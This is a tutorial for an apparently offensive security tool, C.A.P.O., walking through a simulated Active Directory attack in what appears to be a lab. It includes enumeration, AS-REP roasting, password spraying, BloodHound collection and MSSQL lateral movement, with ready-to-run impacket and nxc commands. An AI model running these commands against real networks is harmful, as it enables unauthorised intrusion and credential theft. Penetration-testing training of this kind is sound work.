# C.A.P.O. Active Directory Campaign Tutorial

This tutorial simulates a real-world scenario using C.A.P.O. against an Active Directory target. Our goal is to leverage the new **Campaign Layer** to enumerate a starting machine (`10.129.229.91`), gather credentials, and discover additional endpoints within the domain.

---

## 📚 Scenario Overview

- **Starting Target**: `10.129.229.91`
- **Objective**: Thorough enumeration, find valid credentials, map the domain, and identify lateral movement targets.
- **Key Features Showcased**: Campaign mapping, `{USERFILE}`/`{PASSFILE}` dynamic injection, state synchronization, and context-aware suggestions.

---

## Step 1: Initialize the Campaign

Active Directory engagements usually involve multiple hosts. We want all discovered users, hashes, and credentials to be shared across any machine we touch. We achieve this by setting up a Campaign.

```bash
# Initialize a new campaign called "HTB-Network"
capo target campaign HTB-Network

# Set our initial target IP and link it to the campaign
capo target set 10.129.229.91 --campaign HTB-Network
```

*Note: Your prompt will now indicate both the active workspace (`10.129.229.91`) and the active campaign (`HTB-Network`).*

## Step 2: Initial Reconnaissance

Let's start by doing a basic port scan on the target to figure out if it's a Domain Controller, an Exchange server, or a standalone box.

```bash
# Run a quick top-1000 Nmap scan
capo scan quick

# Send it to the background while we work (optional)
capo scan background
```

Once the scan finishes, C.A.P.O. automatically parses the XML output and saves open ports to the local state.

## Step 3: Review State and Triggers

Check what C.A.P.O. discovered and see what it suggests.

```bash
# View discovered services
capo state services
```

*Imagine the output shows ports `53 (DNS)`, `88 (Kerberos)`, `135 (MSRPC)`, `389 (LDAP)`, and `445 (SMB)`. This is a classic Domain Controller profile.*

Let's see what payloads and tools C.A.P.O. recommends:

```bash
# Show context-aware suggestions based on open ports
capo interact 
```

You'll see suggestions for LDAP enumeration, SMB Null sessions, and AS-REP Roasting.

## Step 4: Extracting Domain Information

Before we can effectively attack AD, we need the NetBIOS and DNS domain names. Let's use `CrackMapExec` or `NetExec` (which C.A.P.O. suggests for port 445).

```bash
# Run a null-session check to extract domain info
capo nxc null
```

*Assume NXC returns the domain `corp.local` and NetBIOS name `CORP`.* 
Let's update our Campaign State with this information:

```bash
# Add domain details to the campaign
capo state ad --domain corp.local --dc 10.129.229.91
```

*(This automatically populates the `{DOMAIN}` and `{DC_IP}` variables for future cheatsheets).*

## Step 5: Harvesting Username Lists

To attack Kerberos or SMB, we need valid usernames. Let's try anonymous LDAP binding, RPC enum, or RID brute-forcing.

```bash
# Try RID Brute-forcing with NXC
capo nxc rid-brute

# Alternatively, run an LDAP enum
capo nxc ldap-enum
```

When you find usernames, you can add them to the campaign state either manually or by relying on C.A.P.O.'s automatic parser to extract them from NXC outputs.

```bash
# Manually adding discovered users
capo state user Administrator
capo state user Guest
capo state user sql_svc
capo state user jsmith
```

**What just happened?** 
C.A.P.O. synced these users to the `HTB-Network` campaign and generated a text file at `<campaign_dir>/loot/users.txt`. The variable `{USERFILE}` now automatically points to this list!

## Step 6: Hunting for Initial Access (AS-REP Roasting)

We have a list of users (`{USERFILE}`). Let's see if any of them have `Do Not Require Pre-Authentication` set. We can consult the C.A.P.O. cheatsheet for active directory attacks.

```bash
# Search for AS-REP scenarios
capo query asrep

# C.A.P.O. suggests a command dynamically injecting your `{USERFILE}`!
# Output: impacket-GetNPUsers corp.local/ -usersfile /path/to/loot/users.txt -format hashcat -outputfile asreproast.txt
```

Run the suggested command. Imagine we successfully get a hash for `sql_svc`.

```bash
# Save the hash to the campaign
capo state hash '$krb...sql_svc...' sql_svc
```

Crack the hash offline with Hashcat. Assume the password is `DatabaseMaster123!`.

```bash
# Add the cracked credential to the campaign
capo state credential sql_svc 'DatabaseMaster123!'
```

## Step 7: Credential Spraying and Validation

Now we have our first valid credential (`sql_svc : DatabaseMaster123!`) and a list of internal users. We should validate this credential and see if it gives us access to other accounts across the network via SMB spraying or Kerberoasting.

Because C.A.P.O. eradicates "First Credential Bias", commands using `{USER}` and `{PASS}` will now dynamically expand to show all valid credentials, while tools that support wordlists will inject `{USERFILE}` and `{PASSFILE}`.

```bash
# Ask C.A.P.O for SMB spraying commands
capo query spray

# Output suggests: nxc smb 10.129.229.91 -u "/path/to/users.txt" -p "/path/to/passwords.txt"
```

Running the spray reveals that `DatabaseMaster123!` also works for `jsmith` and `Administrator`!

```bash
# Update state
capo state credential jsmith 'DatabaseMaster123!'
capo state credential Administrator 'DatabaseMaster123!'
```

## Step 8: Discovering Other Machines

Now that we have Domain Admin (or highly privileged) credentials, let's dump the domain to find other machines.

```bash
# Search for BloodHound / LDAP dumping commands
capo query bloodhound

# Output: nxc ldap 10.129.229.91 -u "/path/to/users.txt" -p "/path/to/passwords.txt" --bloodhound --collection All
```

After running BloodHound or LDAP queries, we find another target: A database server at `10.129.229.155`.

## Step 9: Expanding the Campaign (Lateral Movement)

Let's move our focus to the newly discovered Database Server.

```bash
# Switch target, but stay in the same campaign
capo target set 10.129.229.155 --campaign HTB-Network
```

You are now in a fresh workspace for `10.129.229.155`. Its port `ports`, `directories`, and `scans` are completely fresh and empty.

**However**, because you are still in `HTB-Network`, if you run:
```bash
capo state users
# or
capo state creds
```
You will still see `Administrator`, `jsmith`, and `sql_svc`!

We can immediately pivot into this new box without losing momentum:

```bash
# Query WinRM or MSSQL suggestions for the new target
capo query mssql

# The engine expands your valid credentials ready for copy-pasting:
# impacket-mssqlclient corp.local/sql_svc:'DatabaseMaster123!'@10.129.229.155 -windows-auth
# impacket-mssqlclient corp.local/jsmith:'DatabaseMaster123!'@10.129.229.155 -windows-auth
# impacket-mssqlclient corp.local/Administrator:'DatabaseMaster123!'@10.129.229.155 -windows-auth
```

## Step 10: Profit 🎉

You have successfully:
1. Enumerated a Domain Controller.
2. Built a dynamic `{USERFILE}`.
3. Exploited AD to gain `{PASSFILE}` entries.
4. Used the centralized Campaign Layer to carry those credentials frictionlessly to a new target host.
